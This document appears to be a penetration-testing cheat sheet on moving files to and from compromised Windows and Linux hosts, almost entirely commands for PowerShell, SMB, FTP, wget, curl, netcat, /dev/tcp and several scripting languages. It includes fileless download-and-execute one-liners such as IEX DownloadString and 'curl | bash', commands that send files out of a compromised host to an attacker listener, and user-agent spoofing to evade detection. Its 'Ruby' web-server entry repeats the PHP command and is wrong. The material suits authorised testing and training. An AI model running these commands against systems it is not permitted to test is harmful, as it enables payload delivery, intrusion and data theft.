# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> *"No summoning may begin until the runes are in place."*

---

<details>
<summary><h1>🪟 Windows</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Downloads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>PowerShell Downloads</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h4>PowerShell DownloadFile Method</h4></summary>

**Destination Machine: Sync (Wait for the download to finish)**  

No password
```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
```
Using Credentials
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
```

**Destination Machine: Async (Keep using Powershell while downloading)**  

No password
```powershell
(New-Object Net.WebClient).DownloadFileAsync('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
```
Using Credentials
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>

**Destination Machine: Default**  
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
```

**Destination Machine: Pipeline input**  
```powershell
(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | IEX
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>PowerShell Invoke-WebRequest</h4></summary>

**Destination Machine: Default**  
```powershell
Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <OUTPUT FILE>
```

**Destination Machine: Authentication**  
```powershell
Invoke-WebRequest -Uri "http://<IP>:<PORT>/<FILE>" -Headers @{"Authorization"="Basic "+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("<USER>:<PASSWORD>"))} -OutFile "C:\Users\Public\<FILE>"
```

**Destination Machine: ByPass Internet Explorer Error**  
```powershell
Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
```

**Destination Machine: Skip SSL validation (PowerShell 7+)**  
```powershell
Invoke-WebRequest -Uri "https://<IP>:<PORT>/<FILE>" -OutFile "<FILE>" -SkipCertificateCheck
```

**Destination Machine: Skip SSL validation (PowerShell 5.1 or previous)**  
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile("https://<IP>:<PORT>/<FILE>", "<FILE>")
```

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SMB Downloads</h3></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>Default</h4></summary>  

**Source Machine: Create a temporary SMB Share on Linux and place your target file in it** 

```bash
mkdir /tmp/smbshare
cd /tmp/smbshare
mv <FILE> .
chmod 644 <FILE>
sudo impacket-smbserver share -smb2support .
```

**Destination Machine: Download the files**

**Option 1:** Download a single file
```cmd
copy \\<IP>\share\<FILE>
``` 

**Option 2:** Mount the share
```cmd
net use n: \\<IP>\share /persistent:no
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>Using credentials</h4></summary>  

**Source Machine: Create the SMB Server on Linux**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
```

**Destination Machine: Download the files**  

**Mount the share**
```cmd
net use n: \\<IP>\share /user:<USER> <PASSWORD>
```

**Download the file**
```cmd
copy n:\<FILE>
```

**Unmount the share**
```cmd
net use n: /delete /y
```
</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>FTP Downloads</h3></summary>  

**Source Machine: Setting up a Python3 FTP Server on Linux**
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --user <USER> --password '<USER>'
```

**Destination Machine: Download file using Powershell**
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<USER>')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
```

**Destination Machine: Download file using CMD**  
```cmd
(
  echo open <IP>
  echo user ftpuser ftppass
  echo binary
  echo get <FILE>
  echo bye
) > ftpcommand.txt
ftp -i -v -n -s:ftpcommand.txt
```
---

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📤 Uploads</h2></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h3>PowerShell Uploads</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Base64 Encode & Decode</h4></summary>  

**Source Machine: Encode File Using PowerShell** 
```powershell
# 1. Convert File to Base64
[Convert]::ToBase64String((Get-Content -path "<FILE PATH>" -Encoding byte))

# 2. Computes the MD5 checksum of a file to verify its integrity.
Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
```
We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.  

**Destination Machine: Decode Base64 String on Linux**
```bash
# 1. Save the base64 string to a file
echo "<BASE64STRING>" > encoded.b64

# 2. Decode the base64 to recreate the original file
base64 -d encoded.b64 > decoded.txt

# 3. Verify the MD5 hash matches the Windows version
md5sum decoded.txt
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Web Uploads</h4></summary>  

**Source Machine: Installing a Configured WebServer with Upload on Linux**
```bash
pip3 install uploadserver
python3 -m uploadserver
```

**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Base64 Web Upload</h4></summary>  

**Source Machine: We use Netcat to listen in on a port we specify and send the file as a POST request.**
```bash
nc -lvnp <PORT>
```

**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
```

**Source Machine: We copy the output and use the base64 decode function to convert the base64 string into a file.**
```bash
echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
```
</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h3>SMB Uploads</h3></summary>  

**Source Machine: Installing WebDav Python modules on Linux**
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
```

**Destination Machine: Uploading Files using SMB on Windows**
```cmd
# DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
dir \\192.168.49.128\DavWWWRoot
copy <FILE PATH> \\<IP>\DavWWWRoot\

# You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \<IP>\sharefolder
copy <FILE PATH> \\<IP>\sharefolder\
```
If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>FTP Uploads</h3></summary>

**Source Machine: Start our FTP Server on Linux**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**Destination Machine: Upload the file on Windows**

Option 1: Upload file using Powershell
```cmd
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
```

Option 2: Create a Command File for the FTP Client to Upload a File
Create a Command File for the FTP Client and Download the Target File
```cmd
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT <FILE PATH> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

**Destination Machine: Once in FTP...**
```cmd
USER anonymous
PUT <FILE PATH>
bye
```
</details>
</details>
</details>

---

<details>
<summary><h1>🐧 Linux</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Downloads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Base64 Encoding / Decoding</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
  
**Check File MD5 hash**  
```bash
md5sum <FILE>
```

**Encode file to Base64**  
```bash
# We copy this content and paste it onto our Linux target machine
cat <FILE> |base64 -w 0;echo
```

**Decode the File**  
```bash
echo -n '<BASE64STRING>' | base64 -d > <OUTPUT FILE>
```

**Confirm the MD5 Hashes Match**  
```bash
md5sum <FILE>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Wget Downloads</h3></summary>  

**Basic Download**  
```bash
wget http://<IP>:<PORT>/<FILE>
```

**Download with Custom Filename**  
```bash
wget -O <OUTPUT FILE> http://<IP>:<PORT>/<FILE>
```

**Download with Authentication**  
```bash
wget --user=<USER> --password=<PASSWORD> http://<IP>:<PORT>/<FILE>
```

**Fileless Download**  
```bash
# Executes it directly
wget -qO- http://<IP>:<PORT>/<FILE> | python3
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Curl Downloads</h3></summary>

**Basic Download**  
```bash
curl -O http://<IP>:<PORT>/<FILE>
```

**Ignore SSL certificate**  
```bash
curl -k -O https://<IP>:<PORT>/<FILE>
```

**Download with Custom Filename**  
```bash
curl -o <OUTPUT FILE> http://<IP>:<PORT>/<FILE>
```

**Download with Authentication**  
```bash
curl -u <USER>:<PASSWORD> -O http://<IP>:<PORT>/<FILE>
```

**Fileless Download**  
```bash
# Executes it directly
curl http://<IP>:<PORT>/<FILE> | bash
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Download with Bash</h3></summary>

**Connect to the Target Webserver**  
```bash
exec 3<>/dev/tcp/<IP>/<PORT>
```

**HTTP GET Request**  
```bash
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
```

**Print the Response**  
```bash
cat <&3
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SSH Downloads</h3></summary>

**Source Machine: Starting the SSH Server**  
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

**Source Machine: Checking for SSH Listening Port**  
```bash
#0.0.0.0:22
netstat -lnpt
```

**Destination Machine: Downloading Files Using SCP**  
```bash
scp user@remote_ip:/remote/path/<FILE> /local/path/
```

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📤 Uploads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Web upload</h3></summary>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>Python UploadServer (Basic)</h4></summary>

**Source Machine: Start Web Server**  
```bash
# Run in the target directory
sudo python3 -m pip install --user uploadserver
sudo python3 -m uploadserver <PORT>

#Serving HTTP on 0.0.0.0 port <PORT> (http://0.0.0.0:<PORT>/) ...
```  
  
> **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>Authenticated Web Server</h4></summary>

**Source Machine: Create server.py**  
```python
# server.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64

class AuthHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization')
        if not auth or not auth.startswith('Basic '):
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="Secure Area"')
            self.end_headers()
            return
        
        username, password = base64.b64decode(auth[6:]).decode().split(':', 1)
        if username == '<PORT>' and password == '<PORT>':
            super().do_GET()
        else:
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'Access denied')

HTTPServer(('0.0.0.0', <PORT>), AuthHandler).serve_forever()
```

**Source Machine: Start Web Server**  
```bash
sudo python3 server.py
```

> **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SCP Uploads</h3></summary>  
  
**Upload to Remote Server**  
```bash
scp <FILE> <USER>@<IP>:/remote/path/
```

**Upload with Custom Port**  
```bash
scp -P <PORT> <FILE> <USER>@<IP>:/remote/path/
```

**Upload with Key Authentication**  
```bash
scp -i <KEY FILE> <FILE> <USER>@<IP>:/remote/path/
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>FTP Uploads</h3></summary>

**Source Machine: Using FTP Command**  
```bash
ftp <IP>
# Once connected:

put <FILE>
```

**Source Machine: Using lftp**  
```bash
lftp -u <USER>,<PASSWORD> <IP>

# Once connected:
put <FILE>
```

</details>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Alternative Web File Transfer Method</h3></summary>
A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.

**Source Machine: Creating a Web Server with Python3**  
```bash
python3 -m http.server 8000
```

**Source Machine: Creating a Web Server with Python2.7**  
```bash
python2.7 -m SimpleHTTPServer 8000
```

**Source Machine: Creating a Web Server with PHP**  
```bash
php -S 0.0.0.0:8000
```

**Source Machine: Creating a Web Server with Ruby**  
```bash
php -S 0.0.0.0:8000
```

> **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.

</details>
</details>
</details>

---

<details>
<summary><h1>💻 Code</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>📥 Downloads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Python</h3></summary>

**Python 3**
```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'
```

**Python 2**
```python
python2.7 -c 'import urllib;urllib.urlretrieve ("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>PHP</h3></summary>

**PHP Download with File_get_contents()**
```php
php -r '$file = file_get_contents("http://<IP>:<PORT>/<FILE>"); file_put_contents("<OUTPUT FILE>",$file);'
```  
  
**PHP Download with Fopen()**
```php
php -r 'const BUFFER = 1024; $fremote = 
fopen("http://<IP>:<PORT>/<FILE>", "rb"); $flocal = fopen("<OUTPUT FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```    

**PHP Download a File and Pipe it to Bash**
```php
php -r '$lines = @file("http://<IP>:<PORT>/<FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```    


</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Ruby</h3></summary>

```ruby
ruby -e 'require "net/http"; File.write("<OUTPUT FILE>", Net::HTTP.get(URI.parse("http://<IP>:<PORT>/<FILE>")))'
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Perl</h3></summary>

```perl
perl -e 'use LWP::Simple; getstore("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>");'
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>JavaScript</h3></summary>

**Create the script wget.js**
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```  
  
**Execute the script on Windows (CMD or Powershell)**
```cmd
cscript.exe /nologo wget.js http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
```    

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>VBScript</h3></summary>

**Create the script wget.vbs**
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```  
  
**Execute the script on Windows (CMD or Powershell)**
```cmd
cscript.exe /nologo wget.vbs http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
```    

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>📤 Uploads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Python</h3></summary>

**Python 3**
```python
python3 -c 'import requests;requests.post("http://<IP>:<PORT>/uploads/path/",files={"files":open("<LOCAL FILE>")})'
```
</details>
</details>
</details>

---

<details>
<summary><h1>🧰 Miscellaneous</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>NC</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Netcat</h3></summary>

**Destination Machine: Listening on Port 8000**
```bash
nc -lvnp 8000 > <OUTPUT FILE>
```

**Source Machine: Sending File**
```bash
nc -q 0 <IP> 8000 < <LOCAL FILE>
```

**Reverse File Transfer (Outbound Connection from Compromised Host)**

Instead of listening on the compromised machine, you can listen on your attack host and have the compromised machine connect out. This is useful when inbound connections are blocked by a firewall.

**Destination Machine: Connects to Source Machine and receives file**
```bash
nc <IP> 443 > <OUTPUT FILE>
```

**Source Machine: Listening and sending file as input to Ncat**
```bash
sudo nc -l -p 443 -q 0 < <LOCAL FILE>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Ncat</h3></summary>

**Destination Machine: Listening on Port 8000**
```bash
ncat -l -p 8000 --recv-only > <OUTPUT FILE>
```

**Source Machine: Sending File**
```bash
ncat --send-only <IP> 8000 < <LOCAL FILE>
```

**Reverse File Transfer (Outbound Connection from Compromised Host)**

**Destination Machine: Connects to Source Machine and receives file**
```bash
ncat <IP> 443 --recv-only > <OUTPUT FILE>
```

**Source Machine: Listening and sending file as input to Ncat**
```bash
sudo ncat -l -p 443 --send-only < <LOCAL FILE>
```  

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Bash /dev/tcp</h3></summary>

If Netcat or Ncat are not available, Bash can use the pseudo-device `/dev/tcp/host/port` for file transfers.

**Destination Machine: Receive file using /dev/tcp**
```bash
cat < /dev/tcp/<IP>/443 > <OUTPUT FILE>
```

> **Note:** This method can also be used to transfer files from the compromised host to your Source Machine by reversing the direction of the connection.

</details>
</details>

&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h1>RDP</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>File Transfer via RDP Clipboard</h3></summary>

You can transfer files between your local machine and a remote Windows host using the RDP clipboard (copy-paste) feature. This is supported by most RDP clients if clipboard redirection is enabled.

**On your RDP client (Windows mstsc.exe):**
1. Open `mstsc.exe`.
2. Go to "Show Options" > "Local Resources" tab.
3. Ensure "Clipboard" is checked.
4. Connect to the remote host.
5. Copy files on your local machine and paste them into the remote desktop (or vice versa).

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>File Transfer via RDP Shared Drives</h3></summary>

You can map a local drive to the remote session, making it accessible from the remote host.

**On your RDP client (Windows mstsc.exe):**
1. Open `mstsc.exe`.
2. Go to "Show Options" > "Local Resources" tab.
3. Click "More..." under "Local devices and resources".
4. Check the drives you want to share.
5. Connect to the remote host.
6. The shared drive will appear in "This PC" or "My Computer" on the remote desktop, allowing you to copy files between systems.

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>File Transfer via xfreerdp (Linux)</h3></summary>

If you are using Linux, you can use `xfreerdp` to enable clipboard and drive redirection.

**Clipboard (copy-paste):**
```bash
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> +clipboard
```

**Share a local folder (e.g., /tmp/share):**
```bash
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> +clipboard /drive:share,/tmp/share
```
The shared folder will appear as a drive on the remote Windows session.

</details>
</details>
</details>

---

<details>
<summary><h1>🔒 Protected File Transfers</h1></summary>

> **Note:** Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.

> **Note:** Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file.

&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>File Encryption on Windows</h2></summary>

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [`Invoke-AESEncryption.ps1`](../scripts/file_transfers/Invoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Invoke-AESEncryption.ps1</h3></summary>

**Installation & Configuration**

```powershell
$moduleCode = @'
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
'@

# Create the directory for the current user
$modulePath = "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt"
if (!(Test-Path $modulePath)) {
    New-Item -ItemType Directory -Path $modulePath -Force
}

# Save the module
$moduleCode | Out-File "$modulePath\AESCrypt.psm1" -Encoding utf8

# Import the module
Import-Module AESCrypt -Force

```

> **Note:** To install globally (admin required), use the following route: **$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"**

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>File Encryption Examples</h3></summary>

Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Text "<STRING>" 
```

Decrypts the Base64 encoded string and outputs plain text.
```powershell
Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Text "<BASE64STRING>" 
```

Encrypts the file and outputs an encrypted file ".aes".
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE>
```

Decrypts the ".aes" file and outputs an decrypted file.
```powershell
Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Path <AES FILE>
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Uninstall module</h3></summary>

**Uninstall for current user**
```powershell
Remove-Module AESCrypt -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt" -Recurse -Force
```

**System-wide uninstall (admin required)**
```powershell
Remove-Module AESCrypt -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt" -Recurse -Force
```

**Verify Uninstallation**
```powershell
Get-Module AESCrypt -All | Remove-Module -ErrorAction SilentlyContinue
if (!(Test-Path "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt")) {
    Write-Output "Module completely removed"
}
```

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>File Encryption on Linux</h2></summary>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>openssl</h3></summary>

Encrypting file  

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <ENCRYPTED FILE>
```

Decrypting file   

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <ENCRYPTED FILE> -out <FILE>                    
```

</details>
</details>
</details>

---

<details>
<summary><h1>👻 Evading Detection</h1></summary>

&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h2>Changing User Agent</h2></summary>

**Listing out User Agents**

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Request with Chrome User Agent**
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "C:\Users\Public\<OUTPUT FILE>"
```

</details>
</details>

---
